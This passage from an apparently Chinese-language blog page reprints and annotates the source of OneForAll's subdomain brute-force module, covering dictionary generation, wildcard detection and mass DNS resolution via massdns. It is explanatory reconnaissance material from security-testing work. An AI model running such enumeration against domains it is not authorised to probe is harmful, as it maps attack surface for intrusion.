class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Brute</span>(<span class="hljs-params">Module</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    OneForAll subdomain brute module</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Example：</span><br><span class="hljs-string">        brute.py --target domain.com --word True run</span><br><span class="hljs-string">        brute.py --targets ./domains.txt --word True run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --concurrent 2000 run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --wordlist subnames.txt run</span><br><span class="hljs-string">        brute.py --target domain.com --word True --recursive True --depth 2 run</span><br><span class="hljs-string">        brute.py --target d.com --fuzz True --place m.*.d.com --rule &#x27;[a-z]&#x27; run</span><br><span class="hljs-string">        brute.py --target d.com --fuzz True --place m.*.d.com --fuzzlist subnames.txt run</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Note:</span><br><span class="hljs-string">        --fmt csv/json (result format)</span><br><span class="hljs-string">        --path   Result path (default None, automatically generated)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str  target:     One domain (target or targets must be provided)</span><br><span class="hljs-string">    :param str  targets:    File path of one domain per line</span><br><span class="hljs-string">    :param int  concurrent: Number of concurrent (default 2000)</span><br><span class="hljs-string">    :param bool word:       Use word mode generate dictionary (default False)</span><br><span class="hljs-string">    :param str  wordlist:   Dictionary path used in word mode (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool recursive:  Use recursion (default False)</span><br><span class="hljs-string">    :param int  depth:      Recursive depth (default 2)</span><br><span class="hljs-string">    :param str  nextlist:   Dictionary file path used by recursive (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool fuzz:       Use fuzz mode generate dictionary (default False)</span><br><span class="hljs-string">    :param bool alive:      Only export alive subdomains (default False)</span><br><span class="hljs-string">    :param str  place:      Designated fuzz position (required if use fuzz mode)</span><br><span class="hljs-string">    :param str  rule:       Specify the regexp rules used in fuzz mode (required if use fuzz mode)</span><br><span class="hljs-string">    :param str  fuzzlist:   Dictionary path used in fuzz mode (default use ./config/default.py)</span><br><span class="hljs-string">    :param bool export:     Export the results (default True)</span><br><span class="hljs-string">    :param str  fmt:        Result format (default csv)</span><br><span class="hljs-string">    :param str  path:       Result directory (default None)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 根据用户输入的内容进行初始化</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, target=<span class="hljs-literal">None</span>, targets=<span class="hljs-literal">None</span>, concurrent=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 word=<span class="hljs-literal">False</span>, wordlist=<span class="hljs-literal">None</span>, recursive=<span class="hljs-literal">False</span>, depth=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 nextlist=<span class="hljs-literal">None</span>, fuzz=<span class="hljs-literal">False</span>, place=<span class="hljs-literal">None</span>, rule=<span class="hljs-literal">None</span>, fuzzlist=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 export=<span class="hljs-literal">True</span>, alive=<span class="hljs-literal">True</span>, fmt=<span class="hljs-string">&#x27;csv&#x27;</span>, path=<span class="hljs-literal">None</span></span>):</span><br>        Module.__init__(self)<br>        self.module = <span class="hljs-string">&#x27;Brute&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;Brute&#x27;</span><br>        self.target = target<br>        self.targets = targets<br>        self.concurrent_num = concurrent <span class="hljs-keyword">or</span> settings.brute_concurrent_num<br>        self.word = word<br>        self.wordlist = wordlist <span class="hljs-keyword">or</span> settings.brute_wordlist_path<br>        self.recursive_brute = recursive <span class="hljs-keyword">or</span> settings.enable_recursive_brute<br>        self.recursive_depth = depth <span class="hljs-keyword">or</span> settings.brute_recursive_depth<br>        self.recursive_nextlist = nextlist <span class="hljs-keyword">or</span> settings.recursive_nextlist_path<br>        self.fuzz = fuzz <span class="hljs-keyword">or</span> settings.enable_fuzz<br>        self.place = place <span class="hljs-keyword">or</span> settings.fuzz_place<br>        self.rule = rule <span class="hljs-keyword">or</span> settings.fuzz_rule<br>        self.fuzzlist = fuzzlist <span class="hljs-keyword">or</span> settings.fuzz_list<br>        self.export = export<br>        self.alive = alive<br>        self.fmt = fmt<br>        self.path = path<br>        self.bulk = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 是否是批量爆破场景</span><br>        self.domains = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 待爆破的所有域名集合</span><br>        self.domain = <span class="hljs-built_in">str</span>()  <span class="hljs-comment"># 当前正在进行爆破的域名</span><br>        self.ips_times = <span class="hljs-built_in">dict</span>()  <span class="hljs-comment"># IP集合出现次数</span><br>        self.enable_wildcard = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 当前域名是否使用泛解析</span><br>        self.quite = <span class="hljs-literal">False</span><br>        self.in_china = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_brute_dict</span>(<span class="hljs-params">self, domain</span>):</span><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Generating dictionary for <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>        dict_set = <span class="hljs-built_in">set</span>()<br>        <span class="hljs-comment"># 如果domain不是self.subdomain 而是self.domain的子域则生成递归爆破字典</span><br>        <span class="hljs-keyword">if</span> self.word:<br>            self.place = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.place:<br>            self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + domain<br>        wordlist = self.wordlist<br>        main_domain = utils.get_main_domain(domain)<br>        <span class="hljs-keyword">if</span> domain != main_domain:<br>            wordlist = self.recursive_nextlist<br>        <span class="hljs-keyword">if</span> self.word:<br>            word_subdomains = gen_word_subdomains(self.place, wordlist)<br>            dict_set.update(word_subdomains)<br>        <span class="hljs-keyword">if</span> self.fuzz:<br>            fuzz_subdomains = gen_fuzz_subdomains(self.place, self.rule, self.fuzzlist)<br>            dict_set.update(fuzz_subdomains)<br>        count = <span class="hljs-built_in">len</span>(dict_set)<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Dictionary size: <span class="hljs-subst">&#123;count&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">10000000</span>:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The generated dictionary is &#x27;</span><br>                                <span class="hljs-string">f&#x27;too large <span class="hljs-subst">&#123;count&#125;</span> &gt; 10000000&#x27;</span>)<br>        <span class="hljs-keyword">return</span> dict_set<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_brute_params</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (self.word <span class="hljs-keyword">or</span> self.fuzz):<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Please specify at least one brute mode&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.domains) &gt; <span class="hljs-number">1</span>:<br>            self.bulk = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> self.fuzz:<br>            <span class="hljs-keyword">if</span> self.place <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.rule <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.fuzzlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz rules or fuzz dictionary specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.bulk:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use fuzz mode in the bulk brute&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use recursive brute in fuzz mode&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            fuzz_count = self.place.count(<span class="hljs-string">&#x27;*&#x27;</span>)<br>            <span class="hljs-keyword">if</span> fuzz_count &lt; <span class="hljs-number">1</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> fuzz_count &gt; <span class="hljs-number">1</span>:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Only one fuzz position can be specified&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> self.domain <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.place:<br>                logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Incorrect domain for fuzz&#x27;</span>)<br>                exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_dict_path</span>(<span class="hljs-params">self</span>):</span><br>        data_dir = settings.data_storage_dir<br>        <span class="hljs-keyword">if</span> self.wordlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.wordlist = settings.brute_wordlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames.txt&#x27;</span>)<br>        <span class="hljs-keyword">if</span> self.recursive_nextlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.recursive_nextlist = settings.recursive_nextlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames_next.txt&#x27;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self, domain</span>):</span><br>        start = time.time()<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Blasting <span class="hljs-subst">&#123;domain&#125;</span> &#x27;</span>)<br>        massdns_dir = settings.third_party_dir.joinpath(<span class="hljs-string">&#x27;massdns&#x27;</span>)<br>        result_dir = settings.result_save_dir<br>        temp_dir = result_dir.joinpath(<span class="hljs-string">&#x27;temp&#x27;</span>)<br>        utils.check_dir(temp_dir)<br>        massdns_path = utils.get_massdns_path(massdns_dir)<br>        timestring = utils.get_timestring()<br><br>        wildcard_ips = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 泛解析IP列表</span><br>        wildcard_ttl = <span class="hljs-built_in">int</span>()  <span class="hljs-comment"># 泛解析TTL整型值</span><br>        ns_list = query_domain_ns(self.domain)<br>        ns_ip_list = query_domain_ns_a(ns_list)  <span class="hljs-comment"># DNS权威名称服务器对应A记录列表</span><br>        <span class="hljs-keyword">if</span> self.enable_wildcard <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self.enable_wildcard = wildcard.detect_wildcard(domain)<br><br>        <span class="hljs-keyword">if</span> self.enable_wildcard:<br>            wildcard_ips, wildcard_ttl = wildcard.collect_wildcard_record(domain, ns_ip_list)<br>        ns_path = utils.get_ns_path(self.in_china, self.enable_wildcard, ns_ip_list)<br><br>        dict_set = self.gen_brute_dict(domain)<br><br>        dict_name = <span class="hljs-string">f&#x27;generated_subdomains_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.txt&#x27;</span><br>        dict_path = temp_dir.joinpath(dict_name)<br>        save_brute_dict(dict_path, dict_set)<br>        <span class="hljs-keyword">del</span> dict_set<br>        gc.collect()<br><br>        output_name = <span class="hljs-string">f&#x27;resolved_result_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.json&#x27;</span><br>        output_path = temp_dir.joinpath(output_name)<br>        log_path = result_dir.joinpath(<span class="hljs-string">&#x27;massdns.log&#x27;</span>)<br>        check_dict()<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Running massdns to brute subdomains&#x27;</span>)<br>        utils.call_massdns(massdns_path, dict_path, ns_path, output_path,<br>                           log_path, quiet_mode=self.quite,<br>                           concurrent_num=self.concurrent_num)<br>        appear_times = stat_appear_times(output_path)<br>        self.infos, self.subdomains = deal_output(output_path, appear_times,<br>                                                  wildcard_ips, wildcard_ttl)<br>        delete_file(dict_path, output_path)<br>        end = time.time()<br>        self.elapse = <span class="hljs-built_in">round</span>(end - start, <span class="hljs-number">1</span>)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module takes <span class="hljs-subst">&#123;self.elapse&#125;</span> seconds, &#x27;</span><br>                            <span class="hljs-string">f&#x27;found <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.subdomains)&#125;</span> subdomains of <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module found subdomains of <span class="hljs-subst">&#123;domain&#125;</span>: &#x27;</span><br>                            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.subdomains&#125;</span>&#x27;</span>)<br>        self.gen_result()<br>        self.save_db()<br>        <span class="hljs-keyword">return</span> self.subdomains<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start running <span class="hljs-subst">&#123;self.source&#125;</span> module&#x27;</span>)<br>        <span class="hljs-keyword">if</span> self.in_china <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            _, self.in_china = utils.get_net_env()<br>        self.domains = utils.get_domains(self.target, self.targets)<br>        <span class="hljs-keyword">for</span> self.domain <span class="hljs-keyword">in</span> self.domains:<br>            self.results = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 置空</span><br>            all_subdomains = <span class="hljs-built_in">list</span>()<br>            self.init_dict_path()<br>            self.check_brute_params()<br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the 1 layer subdomain&#x27;</span><br>                                    <span class="hljs-string">f&#x27; of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            valid_subdomains = self.main(self.domain)<br><br>            all_subdomains.extend(valid_subdomains)<br><br>            <span class="hljs-comment"># 递归爆破下一层的子域</span><br>            <span class="hljs-comment"># fuzz模式不使用递归爆破</span><br>            <span class="hljs-keyword">if</span> self.recursive_brute:<br>                <span class="hljs-keyword">for</span> layer_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, self.recursive_depth):<br>                    <span class="hljs-comment"># 之前已经做过1层子域爆破 当前实际递归层数是layer+1</span><br>                    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the <span class="hljs-subst">&#123;layer_num + <span class="hljs-number">1</span>&#125;</span> &#x27;</span><br>                                        <span class="hljs-string">f&#x27;layer subdomain of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>                    <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> all_subdomains:<br>                        self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + subdomain<br>                        <span class="hljs-comment"># 进行下一层子域爆破的限制条件</span><br>                        num = subdomain.count(<span class="hljs-string">&#x27;.&#x27;</span>) - self.domain.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                        <span class="hljs-keyword">if</span> num == layer_num:<br>                            valid_subdomains = self.main(subdomain)<br>                            all_subdomains.extend(valid_subdomains)<br><br>            logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Finished <span class="hljs-subst">&#123;self.source&#125;</span> module to brute <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.path:<br>                name = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span>_brute_result.<span class="hljs-subst">&#123;self.fmt&#125;</span>&#x27;</span><br>                self.path = settings.result_save_dir.joinpath(name)<br>            <span class="hljs-comment"># 数据库导出</span><br>            <span class="hljs-keyword">if</span> self.export:<br>                export.export_data(self.domain,<br>                                   alive=self.alive,<br>                                   limit=<span class="hljs-string">&#x27;resolve&#x27;</span>,<br>                                   path=self.path,<br>                                   fmt=self.fmt)<br></code></pre></div></td></tr></table></figure><h2 id="1-1-init"><a href="#1-1-init" class="headerlink" title="1.1 _init_"></a>1.1 _<em>init</em>_</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 根据用户输入的内容进行初始化</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, target=<span class="hljs-literal">None</span>, targets=<span class="hljs-literal">None</span>, concurrent=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">             word=<span class="hljs-literal">False</span>, wordlist=<span class="hljs-literal">None</span>, recursive=<span class="hljs-literal">False</span>, depth=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">             nextlist=<span class="hljs-literal">None</span>, fuzz=<span class="hljs-literal">False</span>, place=<span class="hljs-literal">None</span>, rule=<span class="hljs-literal">None</span>, fuzzlist=<span class="hljs-literal">None</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">             export=<span class="hljs-literal">True</span>, alive=<span class="hljs-literal">True</span>, fmt=<span class="hljs-string">&#x27;csv&#x27;</span>, path=<span class="hljs-literal">None</span></span>):</span><br>    Module.__init__(self)<br>    self.module = <span class="hljs-string">&#x27;Brute&#x27;</span><br>    self.source = <span class="hljs-string">&#x27;Brute&#x27;</span><br>    self.target = target<br>    self.targets = targets<br>    self.concurrent_num = concurrent <span class="hljs-keyword">or</span> settings.brute_concurrent_num<br>    self.word = word<br>    self.wordlist = wordlist <span class="hljs-keyword">or</span> settings.brute_wordlist_path<br>    self.recursive_brute = recursive <span class="hljs-keyword">or</span> settings.enable_recursive_brute<br>    self.recursive_depth = depth <span class="hljs-keyword">or</span> settings.brute_recursive_depth<br>    self.recursive_nextlist = nextlist <span class="hljs-keyword">or</span> settings.recursive_nextlist_path<br>    self.fuzz = fuzz <span class="hljs-keyword">or</span> settings.enable_fuzz<br>    self.place = place <span class="hljs-keyword">or</span> settings.fuzz_place<br>    self.rule = rule <span class="hljs-keyword">or</span> settings.fuzz_rule<br>    self.fuzzlist = fuzzlist <span class="hljs-keyword">or</span> settings.fuzz_list<br>    self.export = export<br>    self.alive = alive<br>    self.fmt = fmt<br>    self.path = path<br>    self.bulk = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 是否是批量爆破场景</span><br>    self.domains = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 待爆破的所有域名集合</span><br>    self.domain = <span class="hljs-built_in">str</span>()  <span class="hljs-comment"># 当前正在进行爆破的域名</span><br>    self.ips_times = <span class="hljs-built_in">dict</span>()  <span class="hljs-comment"># IP集合出现次数</span><br>    self.enable_wildcard = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 当前域名是否使用泛解析</span><br>    self.quite = <span class="hljs-literal">False</span><br>    self.in_china = <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure><h2 id="1-2-run"><a href="#1-2-run" class="headerlink" title="1.2 run"></a>1.2 run</h2><p>首先运行的函数是run</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def run</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start running <span class="hljs-subst">&#123;self.source&#125;</span> module&#x27;</span>)<br>    <span class="hljs-comment"># 判断环境是否在国内</span><br>    <span class="hljs-keyword">if</span> self.in_china <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 判断网络环境(以及是否在国内)</span><br>        _, self.in_china = utils.get_net_env()<br>    <span class="hljs-comment"># 此处为oneforall.py文件中分析过的获取域名的函数</span><br>    self.domains = utils.get_domains(self.target, self.targets)<br>    <span class="hljs-keyword">for</span> self.domain <span class="hljs-keyword">in</span> self.domains:<br>        self.results = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 置空</span><br>        all_subdomains = <span class="hljs-built_in">list</span>()<br>        <span class="hljs-comment"># 跟进函数 获得具体的文件路径</span><br>        self.init_dict_path()<br>        <span class="hljs-comment"># 检查是否爆破</span><br>        self.check_brute_params()<br>        <span class="hljs-comment"># 判断是否使用递归爆破 之后输出对应信息，具体内容在下一部分</span><br>        <span class="hljs-keyword">if</span> self.recursive_brute:<br>            logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the 1 layer subdomain&#x27;</span><br>                                <span class="hljs-string">f&#x27; of <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># 跟进main函数</span><br>        valid_subdomains = self.main(self.domain)<br>        <span class="hljs-comment"># 添加有效的subdomain</span><br>        all_subdomains.extend(valid_subdomains)<br><br>        <span class="hljs-comment"># 递归爆破下一层的子域</span><br>        <span class="hljs-comment"># fuzz模式不使用递归爆破</span><br>        <span class="hljs-keyword">if</span> self.recursive_brute:<br>            <span class="hljs-keyword">for</span> layer_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, self.recursive_depth):<br>                <span class="hljs-comment"># 之前已经做过1层子域爆破 当前实际递归层数是layer+1</span><br>                logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Start recursively brute the <span class="hljs-subst">&#123;layer_num + <span class="hljs-number">1</span>&#125;</span> &#x27;</span><br>                                    <span class="hljs-string">f&#x27;layer subdomain of <span 